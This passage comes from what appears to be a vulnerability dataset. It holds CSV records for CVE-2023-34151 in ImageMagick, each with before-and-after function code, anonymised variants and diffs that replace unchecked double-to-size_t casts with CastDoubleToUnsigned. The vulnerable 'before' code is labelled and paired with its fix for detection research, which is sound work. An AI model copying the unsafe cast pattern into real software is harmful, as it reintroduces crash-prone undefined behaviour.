          *VAR_5=CastDoubleToUnsigned(VAR_8*PerceptibleReciprocal(
            VAR_28*PerceptibleReciprocal(sqrt(VAR_27)))+0.5);
        }
    }
  return(VAR_7);
}",,"--- func_before
+++ func_after
@@ -47,8 +47,8 @@
       scale.y=geometry_info.sigma;
       if ((percent_flags & SigmaValue) == 0)
         scale.y=scale.x;
-      *width=(size_t) floor(scale.x*stasis_width/100.0+0.5);
-      *height=(size_t) floor(scale.y*stasis_height/100.0+0.5);
+      *width=CastDoubleToUnsigned(scale.x*stasis_width/100.0+0.5);
+      *height=CastDoubleToUnsigned(scale.y*stasis_height/100.0+0.5);
       stasis_width=(*width);
       stasis_height=(*height);
     }
@@ -68,7 +68,7 @@
       if (geometry_ratio >= image_ratio)
         {
           *width=stasis_width;
-          *height=(size_t) floor((double) (PerceptibleReciprocal(
+          *height=CastDoubleToUnsigned((double) (PerceptibleReciprocal(
             geometry_ratio)*stasis_height*image_ratio)+0.5);
         }
       else","{'deleted_lines': ['      *width=(size_t) floor(scale.x*stasis_width/100.0+0.5);', '      *height=(size_t) floor(scale.y*stasis_height/100.0+0.5);', '          *height=(size_t) floor((double) (PerceptibleReciprocal('], 'added_lines': ['      *width=CastDoubleToUnsigned(scale.x*stasis_width/100.0+0.5);', '      *height=CastDoubleToUnsigned(scale.y*stasis_height/100.0+0.5);', '          *height=CastDoubleToUnsigned((double) (PerceptibleReciprocal(']}",True,"A vulnerability was found in ImageMagick. This security flaw ouccers as an undefined behaviors of casting double to size_t in svg, mvg and other coders (recurring bugs of CVE-2022-32546).",5.5,MEDIUM,1,valid,2023-05-18T01:06:15Z,4
CVE-2023-34151,['CWE-190'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,ImageMagick,properly cast double to size_t (https://github.com/ImageMagick/ImageMagick/issues/6341),3d6d98d8a2be30d74172ab43b5b8e874d2deb158,https://github.com/ImageMagick/ImageMagick/commit/3d6d98d8a2be30d74172ab43b5b8e874d2deb158,MagickCore/visual-effects.c,ShadowImage,"MagickExport Image *ShadowImage(const Image *image,const double alpha,
const double sigma,const ssize_t x_offset,const ssize_t y_offset,
ExceptionInfo *exception)
{
#define ShadowImageTag  ""Shadow/Image""
CacheView
*image_view;
ChannelType
channel_mask;
Image
*border_image,
*clone_image,
*shadow_image;
MagickBooleanType
status;
PixelInfo
background_color;
RectangleInfo
border_info;
ssize_t
y;
assert(image != (Image *) NULL);
assert(image->signature == MagickCoreSignature);
assert(exception != (ExceptionInfo *) NULL);
assert(exception->signature == MagickCoreSignature);
if (IsEventLogging() != MagickFalse)
(void) LogMagickEvent(TraceEvent,GetMagickModule(),""%s"",image->filename);
clone_image=CloneImage(image,0,0,MagickTrue,exception);
if (clone_image == (Image *) NULL)
return((Image *) NULL);
if (IsGrayColorspace(image->colorspace) != MagickFalse)
(void) SetImageColorspace(clone_image,sRGBColorspace,exception);
(void) SetImageVirtualPixelMethod(clone_image,EdgeVirtualPixelMethod,
exception);
border_info.width=(size_t) floor(2.0*sigma+0.5);
border_info.height=(size_t) floor(2.0*sigma+0.5);
border_info.x=0;
border_info.y=0;
(void) QueryColorCompliance(""none"",AllCompliance,&clone_image->border_color,
exception);
clone_image->alpha_trait=BlendPixelTrait;
border_image=BorderImage(clone_image,&border_info,OverCompositeOp,exception);
clone_image=DestroyImage(clone_image);
if (border_image == (Image *) NULL)
return((Image *) NULL);
if (border_image->alpha_trait == UndefinedPixelTrait)
(void) SetImageAlphaChannel(border_image,OpaqueAlphaChannel,exception);
status=MagickTrue;
background_color=border_image->background_color;
background_color.alpha_trait=BlendPixelTrait;
image_view=AcquireAuthenticCacheView(border_image,exception);
for (y=0; y < (ssize_t) border_image->rows; y++)
{
Quantum
*magick_restrict q;
ssize_t
x;
if (status == MagickFalse)
continue;
q=QueueCacheViewAuthenticPixels(image_view,0,y,border_image->columns,1,
exception);
if (q == (Quantum *) NULL)
{
status=MagickFalse;
continue;
}
for (x=0; x < (ssize_t) border_image->columns; x++)
{
if (border_image->alpha_trait != UndefinedPixelTrait)
background_color.alpha=GetPixelAlpha(border_image,q)*alpha/100.0;
SetPixelViaPixelInfo(border_image,&background_color,q);
q+=GetPixelChannels(border_image);
}
if (SyncCacheViewAuthenticPixels(image_view,exception) == MagickFalse)
status=MagickFalse;
}
image_view=DestroyCacheView(image_view);
if (status == MagickFalse)
{
border_image=DestroyImage(border_image);
return((Image *) NULL);
}
channel_mask=SetImageChannelMask(border_image,AlphaChannel);
shadow_image=BlurImage(border_image,0.0,sigma,exception);
border_image=DestroyImage(border_image);
if (shadow_image == (Image *) NULL)
return((Image *) NULL);
(void) SetPixelChannelMask(shadow_image,channel_mask);
if (shadow_image->page.width == 0)
shadow_image->page.width=shadow_image->columns;
if (shadow_image->page.height == 0)
shadow_image->page.height=shadow_image->rows;
shadow_image->page.width+=x_offset-(ssize_t) border_info.width;
shadow_image->page.height+=y_offset-(ssize_t) border_info.height;
shadow_image->page.x+=x_offset-(ssize_t) border_info.width;
shadow_image->page.y+=y_offset-(ssize_t) border_info.height;
return(shadow_image);
}","MagickExport VAR_0 *ShadowImage(const Image *VAR_1,const double VAR_2,
const double VAR_3,const ssize_t VAR_4,const ssize_t VAR_5,
ExceptionInfo *VAR_6)
{
#define VAR_7  ""Shadow/Image""
CacheView
*VAR_8;
ChannelType
VAR_9;
Image
*VAR_10,
*VAR_11,
*VAR_12;
MagickBooleanType
VAR_13;
PixelInfo
VAR_14;
RectangleInfo
VAR_15;
ssize_t
VAR_16;
assert(VAR_1 != (Image *) NULL);
assert(VAR_1->signature == VAR_17);
assert(VAR_6 != (ExceptionInfo *) NULL);
assert(VAR_6->signature == VAR_17);
if (IsEventLogging() != VAR_18)
(void) LogMagickEvent(VAR_19,GetMagickModule(),""%s"",VAR_1->filename);
VAR_11=CloneImage(VAR_1,0,0,VAR_20,VAR_6);
if (VAR_11 == (Image *) NULL)
return((Image *) NULL);
if (IsGrayColorspace(VAR_1->colorspace) != VAR_18)
(void) SetImageColorspace(VAR_11,VAR_21,VAR_6);
(void) SetImageVirtualPixelMethod(VAR_11,VAR_22,
VAR_6);
VAR_15.width=(size_t) floor(2.0*VAR_3+0.5);
VAR_15.height=(size_t) floor(2.0*VAR_3+0.5);
VAR_15.x=0;
VAR_15.y=0;
(void) QueryColorCompliance(""none"",VAR_23,&VAR_11->border_color,
VAR_6);
VAR_11->alpha_trait=VAR_24;
VAR_10=BorderImage(VAR_11,&VAR_15,VAR_25,VAR_6);
VAR_11=DestroyImage(VAR_11);
if (VAR_10 == (Image *) NULL)
return((Image *) NULL);
if (VAR_10->alpha_trait == VAR_26)
(void) SetImageAlphaChannel(VAR_10,VAR_27,VAR_6);
VAR_13=VAR_20;
VAR_14=VAR_10->background_color;
VAR_14.alpha_trait=VAR_24;
VAR_8=AcquireAuthenticCacheView(VAR_10,VAR_6);
for (VAR_16=0; VAR_16 < (ssize_t) VAR_10->rows; VAR_16++)
{
Quantum
*magick_restrict VAR_28;
ssize_t
VAR_29;
if (VAR_13 == VAR_18)
continue;
VAR_28=QueueCacheViewAuthenticPixels(VAR_8,0,VAR_16,VAR_10->columns,1,
VAR_6);
if (VAR_28 == (Quantum *) NULL)
{
VAR_13=VAR_18;
continue;
}
for (VAR_29=0; VAR_29 < (ssize_t) VAR_10->columns; VAR_29++)
{
if (VAR_10->alpha_trait != VAR_26)
VAR_14.alpha=GetPixelAlpha(VAR_10,VAR_28)*VAR_2/100.0;
SetPixelViaPixelInfo(VAR_10,&VAR_14,VAR_28);
VAR_28+=GetPixelChannels(VAR_10);
}
if (SyncCacheViewAuthenticPixels(VAR_8,VAR_6) == VAR_18)
VAR_13=VAR_18;
}
VAR_8=DestroyCacheView(VAR_8);
if (VAR_13 == VAR_18)
{
VAR_10=DestroyImage(VAR_10);
return((Image *) NULL);
}
VAR_9=SetImageChannelMask(VAR_10,VAR_30);
VAR_12=BlurImage(VAR_10,0.0,VAR_3,VAR_6);
VAR_10=DestroyImage(VAR_10);
if (VAR_12 == (Image *) NULL)
return((Image *) NULL);
(void) SetPixelChannelMask(VAR_12,VAR_9);
if (VAR_12->page.width == 0)
VAR_12->page.width=VAR_12->columns;
if (VAR_12->page.height == 0)
VAR_12->page.height=VAR_12->rows;
VAR_12->page.width+=VAR_4-(ssize_t) VAR_15.width;
VAR_12->page.height+=VAR_5-(ssize_t) VAR_15.height;
VAR_12->page.x+=VAR_4-(ssize_t) VAR_15.width;
VAR_12->page.y+=VAR_5-(ssize_t) VAR_15.height;
return(VAR_12);
}",,"MagickExport Image *ShadowImage(const Image *image,const double alpha,
  const double sigma,const ssize_t x_offset,const ssize_t y_offset,
  ExceptionInfo *exception)
{
#define ShadowImageTag  ""Shadow/Image""

  CacheView
    *image_view;

  ChannelType
    channel_mask;

  Image
    *border_image,
    *clone_image,
    *shadow_image;

  MagickBooleanType
    status;

  PixelInfo
    background_color;

  RectangleInfo
    border_info;

  ssize_t
    y;

  assert(image != (Image *) NULL);
  assert(image->signature == MagickCoreSignature);
  assert(exception != (ExceptionInfo *) NULL);
  assert(exception->signature == MagickCoreSignature);
  if (IsEventLogging() != MagickFalse)
    (void) LogMagickEvent(TraceEvent,GetMagickModule(),""%s"",image->filename);
  clone_image=CloneImage(image,0,0,MagickTrue,exception);
  if (clone_image == (Image *) NULL)
    return((Image *) NULL);
  if (IsGrayColorspace(image->colorspace) != MagickFalse)
    (void) SetImageColorspace(clone_image,sRGBColorspace,exception);
  (void) SetImageVirtualPixelMethod(clone_image,EdgeVirtualPixelMethod,
    exception);
  border_info.width=CastDoubleToUnsigned(2.0*sigma+0.5);
  border_info.height=CastDoubleToUnsigned(2.0*sigma+0.5);
  border_info.x=0;
  border_info.y=0;
  (void) QueryColorCompliance(""none"",AllCompliance,&clone_image->border_color,
    exception);
  clone_image->alpha_trait=BlendPixelTrait;
  border_image=BorderImage(clone_image,&border_info,OverCompositeOp,exception);
  clone_image=DestroyImage(clone_image);
  if (border_image == (Image *) NULL)
    return((Image *) NULL);
  if (border_image->alpha_trait == UndefinedPixelTrait)
    (void) SetImageAlphaChannel(border_image,OpaqueAlphaChannel,exception);
  /*
    Shadow image.
  */
  status=MagickTrue;
  background_color=border_image->background_color;
  background_color.alpha_trait=BlendPixelTrait;
  image_view=AcquireAuthenticCacheView(border_image,exception);
  for (y=0; y < (ssize_t) border_image->rows; y++)
  {
    Quantum
      *magick_restrict q;

    ssize_t
      x;

    if (status == MagickFalse)
      continue;
    q=QueueCacheViewAuthenticPixels(image_view,0,y,border_image->columns,1,
      exception);
    if (q == (Quantum *) NULL)
      {
        status=MagickFalse;
        continue;
      }
    for (x=0; x < (ssize_t) border_image->columns; x++)
    {
      if (border_image->alpha_trait != UndefinedPixelTrait)
        background_color.alpha=GetPixelAlpha(border_image,q)*alpha/100.0;
      SetPixelViaPixelInfo(border_image,&background_color,q);
      q+=GetPixelChannels(border_image);
    }
    if (SyncCacheViewAuthenticPixels(image_view,exception) == MagickFalse)
      status=MagickFalse;
  }
  image_view=DestroyCacheView(image_view);
  if (status == MagickFalse)
    {
      border_image=DestroyImage(border_image);
      return((Image *) NULL);
    }
  channel_mask=SetImageChannelMask(border_image,AlphaChannel);
  shadow_image=BlurImage(border_image,0.0,sigma,exception);
  border_image=DestroyImage(border_image);
  if (shadow_image == (Image *) NULL)
    return((Image *) NULL);
  (void) SetPixelChannelMask(shadow_image,channel_mask);
  if (shadow_image->page.width == 0)
    shadow_image->page.width=shadow_image->columns;
  if (shadow_image->page.height == 0)
    shadow_image->page.height=shadow_image->rows;
  shadow_image->page.width+=x_offset-(ssize_t) border_info.width;
  shadow_image->page.height+=y_offset-(ssize_t) border_info.height;
  shadow_image->page.x+=x_offset-(ssize_t) border_info.width;
  shadow_image->page.y+=y_offset-(ssize_t) border_info.height;
  return(shadow_image);
}","MagickExport VAR_0 *ShadowImage(const Image *VAR_1,const double VAR_2,
  const double VAR_3,const ssize_t VAR_4,const ssize_t VAR_5,
  ExceptionInfo *VAR_6)
{
#define VAR_7  ""Shadow/Image""

  CacheView
    *VAR_8;

  ChannelType
    VAR_9;

  Image
    *VAR_10,
    *VAR_11,
    *VAR_12;

  MagickBooleanType
    VAR_13;

  PixelInfo
    VAR_14;

  RectangleInfo
    VAR_15;

  ssize_t
    VAR_16;

  assert(VAR_1 != (Image *) NULL);
  assert(VAR_1->signature == VAR_17);
  assert(VAR_6 != (ExceptionInfo *) NULL);
  assert(VAR_6->signature == VAR_17);
  if (IsEventLogging() != VAR_18)
    (void) LogMagickEvent(VAR_19,GetMagickModule(),""%s"",VAR_1->filename);
  VAR_11=CloneImage(VAR_1,0,0,VAR_20,VAR_6);
  if (VAR_11 == (Image *) NULL)
    return((Image *) NULL);
  if (IsGrayColorspace(VAR_1->colorspace) != VAR_18)
    (void) SetImageColorspace(VAR_11,VAR_21,VAR_6);
  (void) SetImageVirtualPixelMethod(VAR_11,VAR_22,
    VAR_6);
  VAR_15.width=CastDoubleToUnsigned(2.0*VAR_3+0.5);
  VAR_15.height=CastDoubleToUnsigned(2.0*VAR_3+0.5);
  VAR_15.x=0;
  VAR_15.y=0;
  (void) QueryColorCompliance(""none"",VAR_23,&VAR_11->border_color,
    VAR_6);
  VAR_11->alpha_trait=VAR_24;
  VAR_10=BorderImage(VAR_11,&VAR_15,VAR_25,VAR_6);
  VAR_11=DestroyImage(VAR_11);
  if (VAR_10 == (Image *) NULL)
    return((Image *) NULL);
  if (VAR_10->alpha_trait == VAR_26)
    (void) SetImageAlphaChannel(VAR_10,VAR_27,VAR_6);
  /* COMMENT_0 */
                 
    
  VAR_13=VAR_20;
  VAR_14=VAR_10->background_color;
  VAR_14.alpha_trait=VAR_24;
  VAR_8=AcquireAuthenticCacheView(VAR_10,VAR_6);
  for (VAR_16=0; VAR_16 < (ssize_t) VAR_10->rows; VAR_16++)
  {
    Quantum
      *magick_restrict VAR_28;

    ssize_t
      VAR_29;

    if (VAR_13 == VAR_18)
      continue;
    VAR_28=QueueCacheViewAuthenticPixels(VAR_8,0,VAR_16,VAR_10->columns,1,
      VAR_6);
    if (VAR_28 == (Quantum *) NULL)
      {
        VAR_13=VAR_18;
        continue;
      }
    for (VAR_29=0; VAR_29 < (ssize_t) VAR_10->columns; VAR_29++)
    {
      if (VAR_10->alpha_trait != VAR_26)
        VAR_14.alpha=GetPixelAlpha(VAR_10,VAR_28)*VAR_2/100.0;
      SetPixelViaPixelInfo(VAR_10,&VAR_14,VAR_28);
      VAR_28+=GetPixelChannels(VAR_10);
    }
    if (SyncCacheViewAuthenticPixels(VAR_8,VAR_6) == VAR_18)
      VAR_13=VAR_18;
  }
  VAR_8=DestroyCacheView(VAR_8);
  if (VAR_13 == VAR_18)
    {
      VAR_10=DestroyImage(VAR_10);
      return((Image *) NULL);
    }
  VAR_9=SetImageChannelMask(VAR_10,VAR_30);
  VAR_12=BlurImage(VAR_10,0.0,VAR_3,VAR_6);
  VAR_10=DestroyImage(VAR_10);
  if (VAR_12 == (Image *) NULL)
    return((Image *) NULL);
  (void) SetPixelChannelMask(VAR_12,VAR_9);
  if (VAR_12->page.width == 0)
    VAR_12->page.width=VAR_12->columns;
  if (VAR_12->page.height == 0)
    VAR_12->page.height=VAR_12->rows;
  VAR_12->page.width+=VAR_4-(ssize_t) VAR_15.width;
  VAR_12->page.height+=VAR_5-(ssize_t) VAR_15.height;
  VAR_12->page.x+=VAR_4-(ssize_t) VAR_15.width;
  VAR_12->page.y+=VAR_5-(ssize_t) VAR_15.height;
  return(VAR_12);
}",,"--- func_before
+++ func_after
@@ -40,8 +40,8 @@
     (void) SetImageColorspace(clone_image,sRGBColorspace,exception);
   (void) SetImageVirtualPixelMethod(clone_image,EdgeVirtualPixelMethod,
     exception);
-  border_info.width=(size_t) floor(2.0*sigma+0.5);
-  border_info.height=(size_t) floor(2.0*sigma+0.5);
+  border_info.width=CastDoubleToUnsigned(2.0*sigma+0.5);
+  border_info.height=CastDoubleToUnsigned(2.0*sigma+0.5);
   border_info.x=0;
   border_info.y=0;
   (void) QueryColorCompliance(""none"",AllCompliance,&clone_image->border_color,","{'deleted_lines': ['  border_info.width=(size_t) floor(2.0*sigma+0.5);', '  border_info.height=(size_t) floor(2.0*sigma+0.5);'], 'added_lines': ['  border_info.width=CastDoubleToUnsigned(2.0*sigma+0.5);', '  border_info.height=CastDoubleToUnsigned(2.0*sigma+0.5);']}",True,"A vulnerability was found in ImageMagick. This security flaw ouccers as an undefined behaviors of casting double to size_t in svg, mvg and other coders (recurring bugs of CVE-2022-32546).",5.5,MEDIUM,1,valid,2023-05-18T01:06:15Z,4
CVE-2023-34151,['CWE-190'],CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H,1,ImageMagick,properly cast double to size_t (https://github.com/ImageMagick/ImageMagick/issues/6341),3d6d98d8a2be30d74172ab43b5b8e874d2deb158,https://github.com/ImageMagick/ImageMagick/commit/3d6d98d8a2be30d74172ab43b5b8e874d2deb158,coders/label.c,ReadLABELImage,"static Image *ReadLABELImage(const ImageInfo *image_info,
ExceptionInfo *exception)
{
char
geometry[MagickPathExtent],
*label;
DrawInfo
*draw_info;
Image
*image;
MagickBooleanType
left_bearing,
status;
TypeMetric
metrics;
size_t
height,
width;
assert(image_info != (const ImageInfo *) NULL);
assert(image_info->signature == MagickCoreSignature);
assert(exception != (ExceptionInfo *) NULL);
assert(exception->signature == MagickCoreSignature);
if (IsEventLogging() != MagickFalse)
(void) LogMagickEvent(TraceEvent,GetMagickModule(),""%s"",
image_info->filename);
image=AcquireImage(image_info,exception);
(void) ResetImagePage(image,""0x0+0+0"");
if ((image->columns != 0) && (image->rows != 0))
{
status=SetImageExtent(image,image->columns,image->rows,exception);
if (status == MagickFalse)
return(DestroyImageList(image));
(void) SetImageBackgroundColor(image,exception);
}
label=InterpretImageProperties((ImageInfo *) image_info,image,
image_info->filename,exception);
if (label == (char *) NULL)
return(DestroyImageList(image));
(void) SetImageProperty(image,""label"",label,exception);
draw_info=CloneDrawInfo(image_info,(DrawInfo *) NULL);
width=(size_t) floor(0.5*draw_info->pointsize*strlen(label)+0.5);
if (AcquireMagickResource(WidthResource,width) == MagickFalse)
{
label=DestroyString(label);
draw_info=DestroyDrawInfo(draw_info);
ThrowReaderException(ImageError,""WidthOrHeightExceedsLimit"");
}
draw_info->text=ConstantString(label);
(void) memset(&metrics,0,sizeof(metrics));
status=GetMultilineTypeMetrics(image,draw_info,&metrics,exception);
AdjustTypeMetricBounds(&metrics);
if ((image->columns == 0) && (image->rows == 0))
{
image->columns=(size_t) floor(metrics.width+draw_info->stroke_width+0.5);
image->rows=(size_t) floor(metrics.height+draw_info->stroke_width+0.5);
}
else
if ((status != MagickFalse) && (strlen(label) > 0) &&
(((image->columns == 0) || (image->rows == 0)) ||
(fabs(image_info->pointsize) < MagickEpsilon)))
{
const char
*option;
double
high,
low;
ssize_t
n;
low=1.0;
option=GetImageOption(image_info,""label:max-pointsize"");
if (option != (const char*) NULL)
{
high=StringToDouble(option,(char**) NULL);
if (high < 1.0)
high=1.0;
high+=1.0;
}
else
{
option=GetImageOption(image_info,""label:start-pointsize"");
if (option != (const char *) NULL)
{
draw_info->pointsize=StringToDouble(option,(char**) NULL);
if (draw_info->pointsize < 1.0)
draw_info->pointsize=1.0;
}
for (n=0; n < 32; n++, draw_info->pointsize*=2.0)
{
(void) FormatLocaleString(geometry,MagickPathExtent,""%+g%+g"",
metrics.bounds.x1,metrics.ascent);
if (draw_info->gravity == UndefinedGravity)
(void) CloneString(&draw_info->geometry,geometry);
status=GetMultilineTypeMetrics(image,draw_info,&metrics,
exception);
if (status == MagickFalse)
break;
AdjustTypeMetricBounds(&metrics);
width=(size_t) floor(metrics.width+draw_info->stroke_width+0.5);
height=(size_t) floor(metrics.height-metrics.underline_position+
draw_info->stroke_width+0.5);
if ((image->columns != 0) && (image->rows != 0))
{
if ((width >= image->columns) || (height >= image->rows))
break;
if ((width < image->columns) && (height < image->rows))
low=draw_info->pointsize;
}
else
if (((image->columns != 0) && (width >= image->columns)) ||
((image->rows != 0) && (height >= image->rows)))
break;
}
if (status == MagickFalse)
{
label=DestroyString(label);
draw_info=DestroyDrawInfo(draw_info);
image=DestroyImageList(image);
return((Image *) NULL);
}
high=draw_info->pointsize;
}
while((high-low) > 0.5)
{
draw_info->pointsize=(low+high)/2.0;
(void) FormatLocaleString(geometry,MagickPathExtent,""%+g%+g"",
metrics.bounds.x1,metrics.ascent);
if (draw_info->gravity == UndefinedGravity)
(void) CloneString(&draw_info->geometry,geometry);
status=GetMultilineTypeMetrics(image,draw_info,&metrics,exception);
if (status == MagickFalse)
break;
AdjustTypeMetricBounds(&metrics);
width=(size_t) floor(metrics.width+draw_info->stroke_width+0.5);
height=(size_t) floor(metrics.height-metrics.underline_position+
draw_info->stroke_width+0.5);
if ((image->columns != 0) && (image->rows != 0))
{
if ((width < image->columns) && (height < image->rows))
low=draw_info->pointsize+0.5;
else
high=draw_info->pointsize-0.5;
}
else
if (((image->columns != 0) && (width < image->columns)) ||
((image->rows != 0) && (height < image->rows)))
low=draw_info->pointsize+0.5;
else
high=draw_info->pointsize-0.5;
}
if (status != MagickFalse)
{
draw_info->pointsize=floor((low+high)/2.0-0.5);
status=GetMultilineTypeMetrics(image,draw_info,&metrics,exception);
AdjustTypeMetricBounds(&metrics);
}
}
label=DestroyString(label);
if (status == MagickFalse)
{
draw_info=DestroyDrawInfo(draw_info);
image=DestroyImageList(image);
return((Image *) NULL);
}
if (image->columns == 0)
image->columns=(size_t) floor(metrics.width+draw_info->stroke_width+0.5);
if (image->columns == 0)
image->columns=(size_t) floor(draw_info->pointsize+draw_info->stroke_width+
0.5);
if (image->rows == 0)
image->rows=(size_t) floor(metrics.height+draw_info->stroke_width+0.5);
if (image->rows == 0)
image->rows=(size_t) floor(draw_info->pointsize+draw_info->stroke_width+
0.5);
status=SetImageExtent(image,image->columns,image->rows,exception);
if (status == MagickFalse)
{
draw_info=DestroyDrawInfo(draw_info);
return(DestroyImageList(image));
}
if (SetImageBackgroundColor(image,exception) == MagickFalse)
{
draw_info=DestroyDrawInfo(draw_info);
image=DestroyImageList(image);
return((Image *) NULL);
}
left_bearing=((draw_info->gravity == UndefinedGravity) ||
(draw_info->gravity == NorthWestGravity) ||
(draw_info->gravity == WestGravity) ||
(draw_info->gravity == SouthWestGravity)) ? MagickTrue : MagickFalse;
(void) FormatLocaleString(geometry,MagickPathExtent,""%+g%+g"",
(draw_info->direction == RightToLeftDirection ? (double) image->columns-
(draw_info->gravity == UndefinedGravity ? metrics.bounds.x2 : 0.0) : 
(left_bearing != MagickFalse ? metrics.bounds.x1 : 0.0)),
(draw_info->gravity == UndefinedGravity ? 
MagickMax(metrics.ascent,metrics.bounds.y2) : 0.0));
(void) CloneString(&draw_info->geometry,geometry);
status=AnnotateImage(image,draw_info,exception);
if (image_info->pointsize == 0.0)
(void) FormatImageProperty(image,""label:pointsize"",""%.20g"",
draw_info->pointsize);
draw_info=DestroyDrawInfo(draw_info);
if (status == MagickFalse)
{
image=DestroyImageList(image);
return((Image *) NULL);
}
return(GetFirstImageInList(image));
}","static Image *ReadLABELImage(const ImageInfo *VAR_0,
ExceptionInfo *VAR_1)
{
char
VAR_2[VAR_3],
*VAR_4;
DrawInfo
*VAR_5;
Image
*VAR_6;
MagickBooleanType
VAR_7,
VAR_8;
TypeMetric
VAR_9;
size_t
VAR_10,
VAR_11;
assert(VAR_0 != (const ImageInfo *) NULL);
assert(VAR_0->signature == VAR_12);
assert(VAR_1 != (ExceptionInfo *) NULL);
assert(VAR_1->signature == VAR_12);
if (IsEventLogging() != VAR_13)
(void) LogMagickEvent(VAR_14,GetMagickModule(),""%s"",
VAR_0->filename);
VAR_6=AcquireImage(VAR_0,VAR_1);
(void) ResetImagePage(VAR_6,""0x0+0+0"");
if ((VAR_6->columns != 0) && (VAR_6->rows != 0))
{
VAR_8=SetImageExtent(VAR_6,VAR_6->columns,VAR_6->rows,VAR_1);
if (VAR_8 == VAR_13)
return(DestroyImageList(VAR_6));
(void) SetImageBackgroundColor(VAR_6,VAR_1);
}
VAR_4=InterpretImageProperties((ImageInfo *) VAR_0,VAR_6,
VAR_0->filename,VAR_1);
if (VAR_4 == (char *) NULL)
return(DestroyImageList(VAR_6));
(void) SetImageProperty(VAR_6,""label"",VAR_4,VAR_1);
VAR_5=CloneDrawInfo(VAR_0,(DrawInfo *) NULL);
VAR_11=(size_t) floor(0.5*VAR_5->pointsize*strlen(VAR_4)+0.5);
if (AcquireMagickResource(VAR_15,VAR_11) == VAR_13)
{
VAR_4=DestroyString(VAR_4);
VAR_5=DestroyDrawInfo(VAR_5);
ThrowReaderException(VAR_16,""WidthOrHeightExceedsLimit"");
}
VAR_5->text=ConstantString(VAR_4);
(void) memset(&VAR_9,0,sizeof(VAR_9));
VAR_8=GetMultilineTypeMetrics(VAR_6,VAR_5,&VAR_9,VAR_1);
AdjustTypeMetricBounds(&VAR_9);
if ((VAR_6->columns == 0) && (VAR_6->rows == 0))
{
VAR_6->columns=(size_t) floor(VAR_9.width+VAR_5->stroke_width+0.5);
VAR_6->rows=(size_t) floor(VAR_9.height+VAR_5->stroke_width+0.5);
}
else
if ((VAR_8 != VAR_13) && (strlen(VAR_4) > 0) &&
(((VAR_6->columns == 0) || (VAR_6->rows == 0)) ||
(fabs(VAR_0->pointsize) < VAR_17)))
{
const char
*VAR_18;
double
VAR_19,
VAR_20;
ssize_t
VAR_21;
VAR_20=1.0;
VAR_18=GetImageOption(VAR_0,""label:max-pointsize"");
if (VAR_18 != (const char*) NULL)
{
VAR_19=StringToDouble(VAR_18,(char**) NULL);
if (VAR_19 < 1.0)
VAR_19=1.0;
VAR_19+=1.0;
}
else
{
VAR_18=GetImageOption(VAR_0,""label:start-pointsize"");
if (VAR_18 != (const char *) NULL)
{
VAR_5->pointsize=StringToDouble(VAR_18,(char**) NULL);
if (VAR_5->pointsize < 1.0)
VAR_5->pointsize=1.0;
}
for (VAR_21=0; VAR_21 < 32; VAR_21++, VAR_5->pointsize*=2.0)
{
(void) FormatLocaleString(VAR_2,VAR_3,""%+g%+g"",
VAR_9.bounds.x1,VAR_9.ascent);
if (VAR_5->gravity == VAR_22)
(void) CloneString(&VAR_5->geometry,VAR_2);
VAR_8=GetMultilineTypeMetrics(VAR_6,VAR_5,&VAR_9,
VAR_1);
if (VAR_8 == VAR_13)
break;
AdjustTypeMetricBounds(&VAR_9);
VAR_11=(size_t) floor(VAR_9.width+VAR_5->stroke_width+0.5);
VAR_10=(size_t) floor(VAR_9.height-VAR_9.underline_position+
VAR_5->stroke_width+0.5);
if ((VAR_6->columns != 0) && (VAR_6->rows != 0))
{
if ((VAR_11 >= VAR_6->columns) || (VAR_10 >= VAR_6->rows))
break;
if ((VAR_11 < VAR_6->columns) && (VAR_10 < VAR_6->rows))
VAR_20=VAR_5->pointsize;
}
else
if (((VAR_6->columns != 0) && (VAR_11 >= VAR_6->columns)) ||
((VAR_6->rows != 0) && (VAR_10 >= VAR_6->rows)))
break;
}
if (VAR_8 == VAR_13)
{
VAR_4=DestroyString(VAR_4);
VAR_5=DestroyDrawInfo(VAR_5);
VAR_6=DestroyImageList(VAR_6);
return((Image *) NULL);
}
VAR_19=VAR_5->pointsize;
}
while((VAR_19-VAR_20) > 0.5)
{
VAR_5->pointsize=(VAR_20+VAR_19)/2.0;
(void) FormatLocaleString(VAR_2,VAR_3,""%+g%+g"",
VAR_9.bounds.x1,VAR_9.ascent);
if (VAR_5->gravity == VAR_22)
(void) CloneString(&VAR_5->geometry,VAR_2);
VAR_8=GetMultilineTypeMetrics(VAR_6,VAR_5,&VAR_9,VAR_1);
if (VAR_8 == VAR_13)
break;
AdjustTypeMetricBounds(&VAR_9);
VAR_11=(size_t) floor(VAR_9.width+VAR_5->stroke_width+0.5);
VAR_10=(size_t) floor(VAR_9.height-VAR_9.underline_position+
VAR_5->stroke_width+0.5);
if ((VAR_6->columns != 0) && (VAR_6->rows != 0))
{
if ((VAR_11 < VAR_6->columns) && (VAR_10 < VAR_6->rows))
VAR_20=VAR_5->pointsize+0.5;
else
VAR_19=VAR_5->pointsize-0.5;
}
else
if (((VAR_6->columns != 0) && (VAR_11 < VAR_6->columns)) ||
((VAR_6->rows != 0) && (VAR_10 < VAR_6->rows)))
VAR_20=VAR_5->pointsize+0.5;
else
VAR_19=VAR_5->pointsize-0.5;
}
if (VAR_8 != VAR_13)
{
VAR_5->pointsize=floor((VAR_20+VAR_19)/2.0-0.5);
VAR_8=GetMultilineTypeMetrics(VAR_6,VAR_5,&VAR_9,VAR_1);
AdjustTypeMetricBounds(&VAR_9);
}
}
VAR_4=DestroyString(VAR_4);
if (VAR_8 == VAR_13)
{
VAR_5=DestroyDrawInfo(VAR_5);
VAR_6=DestroyImageList(VAR_6);
return((Image *) NULL);
}
if (VAR_6->columns == 0)
VAR_6->columns=(size_t) floor(VAR_9.width+VAR_5->stroke_width+0.5);
if (VAR_6->columns == 0)
VAR_6->columns=(size_t) floor(VAR_5->pointsize+VAR_5->stroke_width+
0.5);
if (VAR_6->rows == 0)
VAR_6->rows=(size_t) floor(VAR_9.height+VAR_5->stroke_width+0.5);
if (VAR_6->rows == 0)
VAR_6->rows=(size_t) floor(VAR_5->pointsize+VAR_5->stroke_width+
0.5);
VAR_8=SetImageExtent(VAR_6,VAR_6->columns,VAR_6->rows,VAR_1);
if (VAR_8 == VAR_13)
{
VAR_5=DestroyDrawInfo(VAR_5);
return(DestroyImageList(VAR_6));
}
if (SetImageBackgroundColor(VAR_6,VAR_1) == VAR_13)
{
VAR_5=DestroyDrawInfo(VAR_5);
